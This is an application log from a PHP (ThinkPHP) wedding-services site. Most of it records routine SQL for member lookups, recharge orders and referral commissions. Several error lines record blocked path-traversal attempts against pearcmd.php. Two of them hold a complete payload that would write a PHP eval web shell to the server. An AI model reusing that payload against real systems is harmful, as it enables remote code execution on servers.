[2022-12-11T12:10:46+08:00][error] [2]is_file(): open_basedir restriction in effect. File(/www/wwwroot/www.hunqin.com/vendor/topthink/framework/src/lang/../../../../../../../../usr/local/lib/php/pearcmd.php) is not within the allowed path(s): (/www/wwwroot/www.hunqin.com/:/tmp/)
[2022-12-11T12:10:46+08:00][error] [2]is_file(): open_basedir restriction in effect. File(/www/wwwroot/www.hunqin.com/vendor/topthink/framework/src/lang/../../../../../../../../usr/local/lib/php/pearcmd.php) is not within the allowed path(s): (/www/wwwroot/www.hunqin.com/:/tmp/)
[2022-12-11T12:10:57+08:00][error] [2]is_file(): open_basedir restriction in effect. File(/www/wwwroot/www.hunqin.com/vendor/topthink/framework/src/lang/../../../../../../../../usr/local/lib/php/pearcmd.php) is not within the allowed path(s): (/www/wwwroot/www.hunqin.com/:/tmp/)
[2022-12-11T12:11:19+08:00][error] [2]is_file(): open_basedir restriction in effect. File(/www/wwwroot/www.hunqin.com/vendor/topthink/framework/src/lang/../../../../../../../../usr/local/lib/php/pearcmd.php) is not within the allowed path(s): (/www/wwwroot/www.hunqin.com/:/tmp/)
[2022-12-11T12:25:16+08:00][error] [2]is_file(): open_basedir restriction in effect. File(/www/wwwroot/www.hunqin.com/vendor/topthink/framework/src/lang/../../../../../../../../usr/local/lib/php/pearcmd.php) is not within the allowed path(s): (/www/wwwroot/www.hunqin.com/:/tmp/)
[2022-12-11T12:25:24+08:00][error] [2]is_file(): open_basedir restriction in effect. File(/www/wwwroot/www.hunqin.com/vendor/topthink/framework/src/lang/../../../../../../../../usr/local/lib/php/pearcmd.php) is not within the allowed path(s): (/www/wwwroot/www.hunqin.com/:/tmp/)
[2022-12-11T12:32:03+08:00][sql] CONNECT:[ UseTime:0.000462s ] mysql:host=127.0.0.1;port=3306;dbname=hunqin;charset=utf8
[2022-12-11T12:32:03+08:00][sql] SHOW FULL COLUMNS FROM `gxfc_member` [ RunTime:0.000921s ]
[2022-12-11T12:32:03+08:00][sql] SELECT `member_id` FROM `gxfc_member` WHERE  `status` = 0 [ RunTime:0.000341s ]
[2022-12-11T12:32:03+08:00][sql] SELECT `member_id`,`source_member`,`fenxiao_id`,`is_fenxiao`,`username`,`nickname`,`mobile`,`email`,`password`,`status`,`headimg`,`member_level`,`member_level_name`,`member_label`,`member_label_name`,`qq`,`qq_openid`,`wx_openid`,`weapp_openid`,`wx_unionid`,`ali_openid`,`baidu_openid`,`toutiao_openid`,`douyin_openid`,`login_ip`,`login_type`,`login_time`,`last_login_ip`,`last_login_type`,`last_login_time`,`login_num`,`realname`,`sex`,`location`,`birthday`,`reg_time`,`point`,`balance`,`growth`,`balance_money`,`account5`,`is_auth`,`sign_time`,`sign_days_series`,`pay_password`,`order_money`,`order_complete_money`,`order_num`,`order_complete_num`,`balance_withdraw_apply`,`balance_withdraw`,`is_delete`,`login_type_name`,`hospital_id`,`is_commander`,`self_cl_id`,`hospital_name`,`self_leader_name`,`cl_id`,`is_fenxiao_order`,`expiration_time`,`start_time`,`is_fenxiao_charge` FROM `gxfc_member` WHERE  `member_id` = 2365 LIMIT 1 [ RunTime:0.000576s ]
[2022-12-11T12:32:03+08:00][sql] SELECT `member_level`,`expiration_time`,`start_time` FROM `gxfc_member` WHERE  `member_id` = 2365 LIMIT 1 [ RunTime:0.000332s ]
[2022-12-11T12:32:03+08:00][sql] SELECT `headimg`,`nickname` FROM `gxfc_member` WHERE  `member_id` = 2365  AND `is_delete` = 0 LIMIT 1 [ RunTime:0.000292s ]
[2022-12-11T12:32:03+08:00][sql] SHOW FULL COLUMNS FROM `gxfc_member_recharge_order` [ RunTime:0.000900s ]
[2022-12-11T12:32:03+08:00][sql] INSERT INTO `gxfc_member_recharge_order` SET `recharge_id` = 0 , `order_no` = '20221211123223650001' , `out_trade_no` = '20221211123223650001' , `recharge_name` = '其他' , `cover_img` = '' , `face_value` = 19.8 , `buy_price` = 19.8 , `point` = 19.8 , `growth` = 19.8 , `coupon_id` = 0 , `status` = 1 , `create_time` = 1670733123 , `member_id` = 2365 , `member_img` = 'https://thirdwx.qlogo.cn/mmopen/vi_32/Vpm9UdNTrje9SUxyCQwpMWXKNqXjVvtp2YTFb9hKP2gHQ7siaUEP5e6v3iaVX3mAejDtYklLpSXLxDf0XbFgugcw/132' , `nickname` = 'XX婚礼' , `order_from` = 'weapp' , `order_from_name` = '微信小程序' , `level` = 2 , `type` = 1 [ RunTime:0.000431s ]
[2022-12-11T12:32:03+08:00][sql] SHOW FULL COLUMNS FROM `gxfc_pay` [ RunTime:0.000766s ]
[2022-12-11T12:32:03+08:00][sql] INSERT INTO `gxfc_pay` SET `site_id` = 0 , `out_trade_no` = '20221211123223650001' , `pay_body` = '会员充值套餐，面额：19.8' , `pay_detail` = '会员充值套餐，面额：19.8' , `pay_money` = 19.8 , `pay_no` = '' , `event` = 'MemberRechargeOrderPayNotify' , `return_url` = '' , `pay_status` = 0 , `create_time` = 1670733123 [ RunTime:0.000340s ]
[2022-12-11T12:32:03+08:00][sql] SHOW FULL COLUMNS FROM `gxfc_cron` [ RunTime:0.000625s ]
[2022-12-11T12:32:03+08:00][sql] INSERT INTO `gxfc_cron` SET `type` = 1 , `period` = 0 , `period_type` = 0 , `name` = '订单自动关闭' , `event` = 'MemberRechargeOrderClose' , `execute_time` = 1670734923 , `relate_id` = 194 , `create_time` = 1670733123 [ RunTime:0.000287s ]
[2022-12-11T13:23:04+08:00][error] [2]is_file(): open_basedir restriction in effect. File(/www/wwwroot/www.hunqin.com/vendor/topthink/framework/src/lang/../../../../../../../../usr/local/lib/php/pearcmd&amp;+config-create+/&lt;?=@eval($_request['cmd']);?&gt;+/var/www/html/shell.php.php) is not within the allowed path(s): (/www/wwwroot/www.hunqin.com/:/tmp/)
[2022-12-11T13:23:04+08:00][error] [2]is_file(): open_basedir restriction in effect. File(/www/wwwroot/www.hunqin.com/vendor/topthink/framework/src/lang/../../../../../../../../usr/local/lib/php/pearcmd&amp;+config-create+/&lt;?=@eval($_request['cmd']);?&gt;+/var/www/html/shell.php.php) is not within the allowed path(s): (/www/wwwroot/www.hunqin.com/:/tmp/)
[2022-12-11T13:43:10+08:00][sql] CONNECT:[ UseTime:0.000539s ] mysql:host=127.0.0.1;port=3306;dbname=hunqin;charset=utf8
[2022-12-11T13:43:10+08:00][sql] SHOW FULL COLUMNS FROM `gxfc_member` [ RunTime:0.000997s ]
[2022-12-11T13:43:10+08:00][sql] SELECT `member_id` FROM `gxfc_member` WHERE  `status` = 0 [ RunTime:0.000362s ]
[2022-12-11T13:43:10+08:00][sql] SELECT `member_id`,`source_member`,`fenxiao_id`,`is_fenxiao`,`username`,`nickname`,`mobile`,`email`,`password`,`status`,`headimg`,`member_level`,`member_level_name`,`member_label`,`member_label_name`,`qq`,`qq_openid`,`wx_openid`,`weapp_openid`,`wx_unionid`,`ali_openid`,`baidu_openid`,`toutiao_openid`,`douyin_openid`,`login_ip`,`login_type`,`login_time`,`last_login_ip`,`last_login_type`,`last_login_time`,`login_num`,`realname`,`sex`,`location`,`birthday`,`reg_time`,`point`,`balance`,`growth`,`balance_money`,`account5`,`is_auth`,`sign_time`,`sign_days_series`,`pay_password`,`order_money`,`order_complete_money`,`order_num`,`order_complete_num`,`balance_withdraw_apply`,`balance_withdraw`,`is_delete`,`login_type_name`,`hospital_id`,`is_commander`,`self_cl_id`,`hospital_name`,`self_leader_name`,`cl_id`,`is_fenxiao_order`,`expiration_time`,`start_time`,`is_fenxiao_charge` FROM `gxfc_member` WHERE  `member_id` = 2387 LIMIT 1 [ RunTime:0.000668s ]
[2022-12-11T13:43:10+08:00][sql] SHOW FULL COLUMNS FROM `gxfc_fenxiao` [ RunTime:0.000594s ]
[2022-12-11T13:43:10+08:00][sql] SELECT `f`.*,pf.fenxiao_name as parent_name,`nm`.`nickname`,`nm`.`headimg` FROM `gxfc_fenxiao` `f` LEFT JOIN `gxfc_fenxiao` `pf` ON `pf`.`fenxiao_id`=`f`.`parent` INNER JOIN `gxfc_member` `nm` ON `nm`.`member_id`=`f`.`member_id` WHERE  `f`.`member_id` = 2387  AND `f`.`is_delete` = 0 LIMIT 1 [ RunTime:0.000543s ]
[2022-12-11T13:43:10+08:00][sql] SELECT COUNT(*) AS think_count FROM `gxfc_member` WHERE  `fenxiao_id` = 55  AND `is_fenxiao` = 0  AND `is_delete` = 0 [ RunTime:0.000410s ]
[2022-12-11T13:43:10+08:00][sql] SELECT `f`.`level_id`,`m`.`order_num`,`m`.`order_money`,`f`.`one_fenxiao_order_num`,`f`.`one_fenxiao_order_money`,`f`.`one_child_num`,`f`.`one_child_fenxiao_num`,`fl`.`one_rate`,`fl`.`level_num` FROM `gxfc_fenxiao` `f` INNER JOIN `gxfc_member` `m` ON `f`.`member_id`=`m`.`member_id` INNER JOIN `gxfc_fenxiao_level` `fl` ON `f`.`level_id`=`fl`.`level_id` WHERE  `f`.`member_id` = 2387  AND `f`.`status` = 1  AND `f`.`is_delete` = 0 LIMIT 1 [ RunTime:0.000641s ]
[2022-12-11T13:43:10+08:00][sql] SHOW FULL COLUMNS FROM `gxfc_fenxiao_level` [ RunTime:0.000651s ]
[2022-12-11T13:43:10+08:00][sql] SELECT * FROM `gxfc_fenxiao_level` WHERE  `level_num` >= 1  AND `level_id` <> 1 ORDER BY `level_num` ASC,`one_rate` ASC LIMIT 1 [ RunTime:0.000421s ]
[2022-12-11T13:43:10+08:00][sql] CONNECT:[ UseTime:0.000475s ] mysql:host=127.0.0.1;port=3306;dbname=hunqin;charset=utf8
[2022-12-11T13:43:10+08:00][sql] SHOW FULL COLUMNS FROM `gxfc_member` [ RunTime:0.000971s ]
[2022-12-11T13:43:10+08:00][sql] SELECT `member_id` FROM `gxfc_member` WHERE  `status` = 0 [ RunTime:0.000361s ]
[2022-12-11T13:43:10+08:00][sql] SELECT `member_id`,`source_member`,`fenxiao_id`,`is_fenxiao`,`username`,`nickname`,`mobile`,`email`,`password`,`status`,`headimg`,`member_level`,`member_level_name`,`member_label`,`member_label_name`,`qq`,`qq_openid`,`wx_openid`,`weapp_openid`,`wx_unionid`,`ali_openid`,`baidu_openid`,`toutiao_openid`,`douyin_openid`,`login_ip`,`login_type`,`login_time`,`last_login_ip`,`last_login_type`,`last_login_time`,`login_num`,`realname`,`sex`,`location`,`birthday`,`reg_time`,`point`,`balance`,`growth`,`balance_money`,`account5`,`is_auth`,`sign_time`,`sign_days_series`,`pay_password`,`order_money`,`order_complete_money`,`order_num`,`order_complete_num`,`balance_withdraw_apply`,`balance_withdraw`,`is_delete`,`login_type_name`,`hospital_id`,`is_commander`,`self_cl_id`,`hospital_name`,`self_leader_name`,`cl_id`,`is_fenxiao_order`,`expiration_time`,`start_time`,`is_fenxiao_charge` FROM `gxfc_member` WHERE  `member_id` = 2387 LIMIT 1 [ RunTime:0.000546s ]
[2022-12-11T13:43:10+08:00][sql] SHOW FULL COLUMNS FROM `gxfc_fenxiao` [ RunTime:0.000648s ]
[2022-12-11T13:43:10+08:00][sql] SELECT `fenxiao_id`,`fenxiao_no`,`fenxiao_name`,`mobile`,`member_id`,`level_id`,`level_name`,`parent`,`grand_parent`,`account`,`account_withdraw`,`account_withdraw_apply`,`status`,`create_time`,`audit_time`,`lock_time`,`one_fenxiao_order_num`,`one_fenxiao_order_money`,`one_child_num`,`one_child_fenxiao_num`,`two_child_fenxiao_num`,`total_commission`,`is_delete`,`two_rate` FROM `gxfc_fenxiao` WHERE  `member_id` = 2387 LIMIT 1 [ RunTime:0.000411s ]
[2022-12-11T13:43:10+08:00][sql] SELECT `member_id`,`source_member`,`fenxiao_id`,`is_fenxiao`,`username`,`nickname`,`mobile`,`email`,`password`,`status`,`headimg`,`member_level`,`member_level_name`,`member_label`,`member_label_name`,`qq`,`qq_openid`,`wx_openid`,`weapp_openid`,`wx_unionid`,`ali_openid`,`baidu_openid`,`toutiao_openid`,`douyin_openid`,`login_ip`,`login_type`,`login_time`,`last_login_ip`,`last_login_type`,`last_login_time`,`login_num`,`realname`,`sex`,`location`,`birthday`,`reg_time`,`point`,`balance`,`growth`,`balance_money`,`account5`,`is_auth`,`sign_time`,`sign_days_series`,`pay_password`,`order_money`,`order_complete_money`,`order_num`,`order_complete_num`,`balance_withdraw_apply`,`balance_withdraw`,`is_delete`,`login_type_name`,`hospital_id`,`is_commander`,`self_cl_id`,`hospital_name`,`self_leader_name`,`cl_id`,`is_fenxiao_order`,`expiration_time`,`start_time`,`is_fenxiao_charge` FROM `gxfc_member` WHERE  `source_member` = 2387 [ RunTime:0.000575s ]
[2022-12-11T13:43:10+08:00][sql] SHOW FULL COLUMNS FROM `gxfc_fenxiao_account` [ RunTime:0.000569s ]
[2022-12-11T13:43:10+08:00][sql] SELECT `id`,`account_no`,`fenxiao_id`,`fenxiao_name`,`money`,`type`,`type_name`,`relate_id`,`create_time` FROM `gxfc_fenxiao_account` WHERE  `fenxiao_id` = 55 [ RunTime:0.000314s ]
[2022-12-11T13:43:10+08:00][sql] SHOW FULL COLUMNS FROM `gxfc_fenxiao_order` [ RunTime:0.000820s ]
[2022-12-11T13:43:10+08:00][sql] SELECT sum(one_commission) as commission FROM `gxfc_fenxiao_order` WHERE  `one_fenxiao_id` = 55  AND `create_time` BETWEEN 1670688000 AND 1670774400   AND `is_settlement` = 1 LIMIT 1 [ RunTime:0.000332s ]
[2022-12-11T13:43:10+08:00][sql] SELECT sum(two_commission) as commission FROM `gxfc_fenxiao_order` WHERE  `two_fenxiao_id` = 55  AND `create_time` BETWEEN 1670688000 AND 1670774400   AND `is_settlement` = 1 LIMIT 1 [ RunTime:0.000264s ]
[2022-12-11T13:43:10+08:00][sql] SELECT sum(three_commission) as commission FROM `gxfc_fenxiao_order` WHERE  `three_fenxiao_id` = 55  AND `create_time` BETWEEN 1670688000 AND 1670774400   AND `is_settlement` = 1 LIMIT 1 [ RunTime:0.000251s ]
[2022-12-11T13:43:10+08:00][sql] SELECT sum(real_goods_money) as real_goods_money FROM `gxfc_fenxiao_order` WHERE  ( `one_fenxiao_id` = 55 OR `two_fenxiao_id` = 55 OR `three_fenxiao_id` = 55 ) LIMIT 1 [ RunTime:0.000279s ]
[2022-12-11T13:43:17+08:00][sql] CONNECT:[ UseTime:0.000447s ] mysql:host=127.0.0.1;port=3306;dbname=hunqin;charset=utf8
[2022-12-11T13:43:17+08:00][sql] SHOW FULL COLUMNS FROM `gxfc_member` [ RunTime:0.000852s ]
[2022-12-11T13:43:17+08:00][sql] SELECT `member_id` FROM `gxfc_member` WHERE  `status` = 0 [ RunTime:0.000315s ]
[2022-12-11T13:43:17+08:00][sql] SELECT `member_id`,`source_member`,`fenxiao_id`,`is_fenxiao`,`username`,`nickname`,`mobile`,`email`,`password`,`status`,`headimg`,`member_level`,`member_level_name`,`member_label`,`member_label_name`,`qq`,`qq_openid`,`wx_openid`,`weapp_openid`,`wx_unionid`,`ali_openid`,`baidu_openid`,`toutiao_openid`,`douyin_openid`,`login_ip`,`login_type`,`login_time`,`last_login_ip`,`last_login_type`,`last_login_time`,`login_num`,`realname`,`sex`,`location`,`birthday`,`reg_time`,`point`,`balance`,`growth`,`balance_money`,`account5`,`is_auth`,`sign_time`,`sign_days_series`,`pay_password`,`order_money`,`order_complete_money`,`order_num`,`order_complete_num`,`balance_withdraw_apply`,`balance_withdraw`,`is_delete`,`login_type_name`,`hospital_id`,`is_commander`,`self_cl_id`,`hospital_name`,`self_leader_name`,`cl_id`,`is_fenxiao_order`,`expiration_time`,`start_time`,`is_fenxiao_charge` FROM `gxfc_member` WHERE  `member_id` = 2387 LIMIT 1 [ RunTime:0.000513s ]
[2022-12-11T13:43:17+08:00][sql] SHOW FULL COLUMNS FROM `gxfc_fenxiao` [ RunTime:0.000655s ]
[2022-12-11T13:43:17+08:00][sql] SELECT `f`.*,pf.fenxiao_name as parent_name,`nm`.`nickname`,`nm`.`headimg` FROM `gxfc_fenxiao` `f` LEFT JOIN `gxfc_fenxiao` `pf` ON `pf`.`fenxiao_id`=`f`.`parent` INNER JOIN `gxfc_member` `nm` ON `nm`.`member_id`=`f`.`member_id` WHERE  `f`.`member_id` = 2387  AND `f`.`is_delete` = 0 LIMIT 1 [ RunTime:0.000503s ]
[2022-12-11T13:43:17+08:00][sql] SELECT COUNT(*) AS think_count FROM `gxfc_member` WHERE  `fenxiao_id` = 55  AND `is_fenxiao` = 0  AND `is_delete` = 0 [ RunTime:0.000268s ]
[2022-12-11T13:43:17+08:00][sql] SELECT `f`.`level_id`,`m`.`order_num`,`m`.`order_money`,`f`.`one_fenxiao_order_num`,`f`.`one_fenxiao_order_money`,`f`.`one_child_num`,`f`.`one_child_fenxiao_num`,`fl`.`one_rate`,`fl`.`level_num` FROM `gxfc_fenxiao` `f` INNER JOIN `gxfc_member` `m` ON `f`.`member_id`=`m`.`member_id` INNER JOIN `gxfc_fenxiao_level` `fl` ON `f`.`level_id`=`fl`.`level_id` WHERE  `f`.`member_id` = 2387  AND `f`.`status` = 1  AND `f`.`is_delete` = 0 LIMIT 1 [ RunTime:0.000426s ]
[2022-12-11T13:43:17+08:00][sql] SHOW FULL COLUMNS FROM `gxfc_fenxiao_level` [ RunTime:0.000448s ]
[2022-12-11T13:43:17+08:00][sql] SELECT * FROM `gxfc_fenxiao_level` WHERE  `level_num` >= 1  AND `level_id` <> 1 ORDER BY `level_num` ASC,`one_rate` ASC LIMIT 1 [ RunTime:0.000329s ]
[2022-12-11T13:43:17+08:00][sql] SHOW FULL COLUMNS FROM `gxfc_fenxiao_order` [ RunTime:0.000739s ]
[2022-12-11T13:43:17+08:00][sql] SELECT sum(one_commission) as commission FROM `gxfc_fenxiao_order` WHERE  `one_fenxiao_id` = 55  AND `create_time` BETWEEN 1670688000 AND 1670774400   AND `is_settlement` = 1 LIMIT 1 [ RunTime:0.000312s ]
[2022-12-11T13:43:17+08:00][sql] SELECT sum(two_commission) as commission FROM `gxfc_fenxiao_order` WHERE  `two_fenxiao_id` = 55  AND `create_time` BETWEEN 1670688000 AND 1670774400   AND `is_settlement` = 1 LIMIT 1 [ RunTime:0.000265s ]
[2022-12-11T13:43:17+08:00][sql] SELECT sum(three_commission) as commission FROM `gxfc_fenxiao_order` WHERE  `three_fenxiao_id` = 55  AND `create_time` BETWEEN 1670688000 AND 1670774400   AND `is_settlement` = 1 LIMIT 1 [ RunTime:0.000265s ]
[2022-12-11T13:43:17+08:00][sql] SELECT sum(real_goods_money) as real_goods_money FROM `gxfc_fenxiao_order` WHERE  ( `one_fenxiao_id` = 55 OR `two_fenxiao_id` = 55 OR `three_fenxiao_id` = 55 ) LIMIT 1 [ RunTime:0.000324s ]
[2022-12-11T13:43:17+08:00][sql] CONNECT:[ UseTime:0.000409s ] mysql:host=127.0.0.1;port=3306;dbname=hunqin;charset=utf8
[2022-12-11T13:43:17+08:00][sql] SHOW FULL COLUMNS FROM `gxfc_member` [ RunTime:0.000934s ]
[2022-12-11T13:43:17+08:00][sql] SELECT `member_id` FROM `gxfc_member` WHERE  `status` = 0 [ RunTime:0.000365s ]
[2022-12-11T13:43:17+08:00][sql] SELECT `member_id`,`source_member`,`fenxiao_id`,`is_fenxiao`,`username`,`nickname`,`mobile`,`email`,`password`,`status`,`headimg`,`member_level`,`member_level_name`,`member_label`,`member_label_name`,`qq`,`qq_openid`,`wx_openid`,`weapp_openid`,`wx_unionid`,`ali_openid`,`baidu_openid`,`toutiao_openid`,`douyin_openid`,`login_ip`,`login_type`,`login_time`,`last_login_ip`,`last_login_type`,`last_login_time`,`login_num`,`realname`,`sex`,`location`,`birthday`,`reg_time`,`point`,`balance`,`growth`,`balance_money`,`account5`,`is_auth`,`sign_time`,`sign_days_series`,`pay_password`,`order_money`,`order_complete_money`,`order_num`,`order_complete_num`,`balance_withdraw_apply`,`balance_withdraw`,`is_delete`,`login_type_name`,`hospital_id`,`is_commander`,`self_cl_id`,`hospital_name`,`self_leader_name`,`cl_id`,`is_fenxiao_order`,`expiration_time`,`start_time`,`is_fenxiao_charge` FROM `gxfc_member` WHERE  `member_id` = 2387 LIMIT 1 [ RunTime:0.000598s ]
[2022-12-11T13:43:17+08:00][sql] SELECT `nickname`,`headimg` FROM `gxfc_member` WHERE  `member_id` = 2387 LIMIT 1 [ RunTime:0.000459s ]
[2022-12-11T13:44:55+08:00][sql] CONNECT:[ UseTime:0.000433s ] mysql:host=127.0.0.1;port=3306;dbname=hunqin;charset=utf8
[2022-12-11T13:44:55+08:00][sql] SHOW FULL COLUMNS FROM `gxfc_member` [ RunTime:0.000833s ]
[2022-12-11T13:44:55+08:00][sql] SELECT `member_id` FROM `gxfc_member` WHERE  `status` = 0 [ RunTime:0.000318s ]
[2022-12-11T13:44:55+08:00][sql] SELECT `member_id`,`source_member`,`fenxiao_id`,`is_fenxiao`,`username`,`nickname`,`mobile`,`email`,`password`,`status`,`headimg`,`member_level`,`member_level_name`,`member_label`,`member_label_name`,`qq`,`qq_openid`,`wx_openid`,`weapp_openid`,`wx_unionid`,`ali_openid`,`baidu_openid`,`toutiao_openid`,`douyin_openid`,`login_ip`,`login_type`,`login_time`,`last_login_ip`,`last_login_type`,`last_login_time`,`login_num`,`realname`,`sex`,`location`,`birthday`,`reg_time`,`point`,`balance`,`growth`,`balance_money`,`account5`,`is_auth`,`sign_time`,`sign_days_series`,`pay_password`,`order_money`,`order_complete_money`,`order_num`,`order_complete_num`,`balance_withdraw_apply`,`balance_withdraw`,`is_delete`,`login_type_name`,`hospital_id`,`is_commander`,`self_cl_id`,`hospital_name`,`self_leader_name`,`cl_id`,`is_fenxiao_order`,`expiration_time`,`start_time`,`is_fenxiao_charge` FROM `gxfc_member` WHERE  `member_id` = 2387 LIMIT 1 [ RunTime:0.000611s ]
[2022-12-11T13:44:55+08:00][sql] SHOW FULL COLUMNS FROM `gxfc_fenxiao` [ RunTime:0.000599s ]
[2022-12-11T13:44:55+08:00][sql] SELECT `f`.*,pf.fenxiao_name as parent_name,`nm`.`nickname`,`nm`.`headimg` FROM `gxfc_fenxiao` `f` LEFT JOIN `gxfc_fenxiao` `pf` ON `pf`.`fenxiao_id`=`f`.`parent` INNER JOIN `gxfc_member` `nm` ON `nm`.`member_id`=`f`.`member_id` WHERE  `f`.`member_id` = 2387  AND `f`.`is_delete` = 0 LIMIT 1 [ RunTime:0.000522s ]
[2022-12-11T13:44:55+08:00][sql] SELECT COUNT(*) AS think_count FROM `gxfc_member` WHERE  `fenxiao_id` = 55  AND `is_fenxiao` = 0  AND `is_delete` = 0 [ RunTime:0.001051s ]
[2022-12-11T13:44:55+08:00][sql] SELECT `f`.`level_id`,`m`.`order_num`,`m`.`order_money`,`f`.`one_fenxiao_order_num`,`f`.`one_fenxiao_order_money`,`f`.`one_child_num`,`f`.`one_child_fenxiao_num`,`fl`.`one_rate`,`fl`.`level_num` FROM `gxfc_fenxiao` `f` INNER JOIN `gxfc_member` `m` ON `f`.`member_id`=`m`.`member_id` INNER JOIN `gxfc_fenxiao_level` `fl` ON `f`.`level_id`=`fl`.`level_id` WHERE  `f`.`member_id` = 2387  AND `f`.`status` = 1  AND `f`.`is_delete` = 0 LIMIT 1 [ RunTime:0.000471s ]
[2022-12-11T13:44:55+08:00][sql] SHOW FULL COLUMNS FROM `gxfc_fenxiao_level` [ RunTime:0.000556s ]
[2022-12-11T13:44:55+08:00][sql] SELECT * FROM `gxfc_fenxiao_level` WHERE  `level_num` >= 1  AND `level_id` <> 1 ORDER BY `level_num` ASC,`one_rate` ASC LIMIT 1 [ RunTime:0.000351s ]
[2022-12-11T13:44:55+08:00][sql] SHOW FULL COLUMNS FROM `gxfc_fenxiao_order` [ RunTime:0.000724s ]
[2022-12-11T13:44:55+08:00][sql] SELECT sum(one_commission) as commission FROM `gxfc_fenxiao_order` WHERE  `one_fenxiao_id` = 55  AND `create_time` BETWEEN 1670688000 AND 1670774400   AND `is_settlement` = 1 LIMIT 1 [ RunTime:0.000342s ]
[2022-12-11T13:44:55+08:00][sql] SELECT sum(two_commission) as commission FROM `gxfc_fenxiao_order` WHERE  `two_fenxiao_id` = 55  AND `create_time` BETWEEN 1670688000 AND 1670774400   AND `is_settlement` = 1 LIMIT 1 [ RunTime:0.000274s ]
[2022-12-11T13:44:55+08:00][sql] SELECT sum(three_commission) as commission FROM `gxfc_fenxiao_order` WHERE  `three_fenxiao_id` = 55  AND `create_time` BETWEEN 1670688000 AND 1670774400   AND `is_settlement` = 1 LIMIT 1 [ RunTime:0.000270s ]
[2022-12-11T13:44:55+08:00][sql] SELECT sum(real_goods_money) as real_goods_money FROM `gxfc_fenxiao_order` WHERE  ( `one_fenxiao_id` = 55 OR `two_fenxiao_id` = 55 OR `three_fenxiao_id` = 55 ) LIMIT 1 [ RunTime:0.000244s ]
[2022-12-11T13:44:55+08:00][sql] CONNECT:[ UseTime:0.000423s ] mysql:host=127.0.0.1;port=3306;dbname=hunqin;charset=utf8
[2022-12-11T13:44:55+08:00][sql] SHOW FULL COLUMNS FROM `gxfc_member` [ RunTime:0.000865s ]
[2022-12-11T13:44:55+08:00][sql] SELECT `member_id` FROM `gxfc_member` WHERE  `status` = 0 [ RunTime:0.000340s ]
[2022-12-11T13:44:55+08:00][sql] SELECT `member_id`,`source_member`,`fenxiao_id`,`is_fenxiao`,`username`,`nickname`,`mobile`,`email`,`password`,`status`,`headimg`,`member_level`,`member_level_name`,`member_label`,`member_label_name`,`qq`,`qq_openid`,`wx_openid`,`weapp_openid`,`wx_unionid`,`ali_openid`,`baidu_openid`,`toutiao_openid`,`douyin_openid`,`login_ip`,`login_type`,`login_time`,`last_login_ip`,`last_login_type`,`last_login_time`,`login_num`,`realname`,`sex`,`location`,`birthday`,`reg_time`,`point`,`balance`,`growth`,`balance_money`,`account5`,`is_auth`,`sign_time`,`sign_days_series`,`pay_password`,`order_money`,`order_complete_money`,`order_num`,`order_complete_num`,`balance_withdraw_apply`,`balance_withdraw`,`is_delete`,`login_type_name`,`hospital_id`,`is_commander`,`self_cl_id`,`hospital_name`,`self_leader_name`,`cl_id`,`is_fenxiao_order`,`expiration_time`,`start_time`,`is_fenxiao_charge` FROM `gxfc_member` WHERE  `member_id` = 2387 LIMIT 1 [ RunTime:0.000728s ]
[2022-12-11T13:44:55+08:00][sql] SELECT `nickname`,`headimg` FROM `gxfc_member` WHERE  `member_id` = 2387 LIMIT 1 [ RunTime:0.000327s ]
[2022-12-11T14:50:34+08:00][sql] CONNECT:[ UseTime:0.000450s ] mysql:host=127.0.0.1;port=3306;dbname=hunqin;charset=utf8
[2022-12-11T14:50:34+08:00][sql] SHOW FULL COLUMNS FROM `gxfc_member` [ RunTime:0.000949s ]
[2022-12-11T14:50:34+08:00][sql] CONNECT:[ UseTime:0.000332s ] mysql:host=127.0.0.1;port=3306;dbname=hunqin;charset=utf8
[2022-12-11T14:50:34+08:00][sql] SELECT `member_id` FROM `gxfc_member` WHERE  `status` = 0 [ RunTime:0.000413s ]
[2022-12-11T14:50:34+08:00][sql] SHOW FULL COLUMNS FROM `gxfc_member` [ RunTime:0.000854s ]
[2022-12-11T14:50:34+08:00][sql] SELECT `member_id` FROM `gxfc_member` WHERE  `status` = 0 [ RunTime:0.000340s ]
[2022-12-11T14:50:34+08:00][sql] SELECT `member_id`,`source_member`,`fenxiao_id`,`is_fenxiao`,`username`,`nickname`,`mobile`,`email`,`password`,`status`,`headimg`,`member_level`,`member_level_name`,`member_label`,`member_label_name`,`qq`,`qq_openid`,`wx_openid`,`weapp_openid`,`wx_unionid`,`ali_openid`,`baidu_openid`,`toutiao_openid`,`douyin_openid`,`login_ip`,`login_type`,`login_time`,`last_login_ip`,`last_login_type`,`last_login_time`,`login_num`,`realname`,`sex`,`location`,`birthday`,`reg_time`,`point`,`balance`,`growth`,`balance_money`,`account5`,`is_auth`,`sign_time`,`sign_days_series`,`pay_password`,`order_money`,`order_complete_money`,`order_num`,`order_complete_num`,`balance_withdraw_apply`,`balance_withdraw`,`is_delete`,`login_type_name`,`hospital_id`,`is_commander`,`self_cl_id`,`hospital_name`,`self_leader_name`,`cl_id`,`is_fenxiao_order`,`expiration_time`,`start_time`,`is_fenxiao_charge` FROM `gxfc_member` WHERE  `member_id` = 2365 LIMIT 1 [ RunTime:0.000597s ]
[2022-12-11T14:50:34+08:00][sql] SELECT `member_id`,`source_member`,`fenxiao_id`,`is_fenxiao`,`username`,`nickname`,`mobile`,`email`,`password`,`status`,`headimg`,`member_level`,`member_level_name`,`member_label`,`member_label_name`,`qq`,`qq_openid`,`wx_openid`,`weapp_openid`,`wx_unionid`,`ali_openid`,`baidu_openid`,`toutiao_openid`,`douyin_openid`,`login_ip`,`login_type`,`login_time`,`last_login_ip`,`last_login_type`,`last_login_time`,`login_num`,`realname`,`sex`,`location`,`birthday`,`reg_time`,`point`,`balance`,`growth`,`balance_money`,`account5`,`is_auth`,`sign_time`,`sign_days_series`,`pay_password`,`order_money`,`order_complete_money`,`order_num`,`order_complete_num`,`balance_withdraw_apply`,`balance_withdraw`,`is_delete`,`login_type_name`,`hospital_id`,`is_commander`,`self_cl_id`,`hospital_name`,`self_leader_name`,`cl_id`,`is_fenxiao_order`,`expiration_time`,`start_time`,`is_fenxiao_charge` FROM `gxfc_member` WHERE  `member_id` = 2365 LIMIT 1 [ RunTime:0.000596s ]
[2022-12-11T14:50:34+08:00][sql] SHOW FULL COLUMNS FROM `gxfc_fenxiao` [ RunTime:0.000619s ]
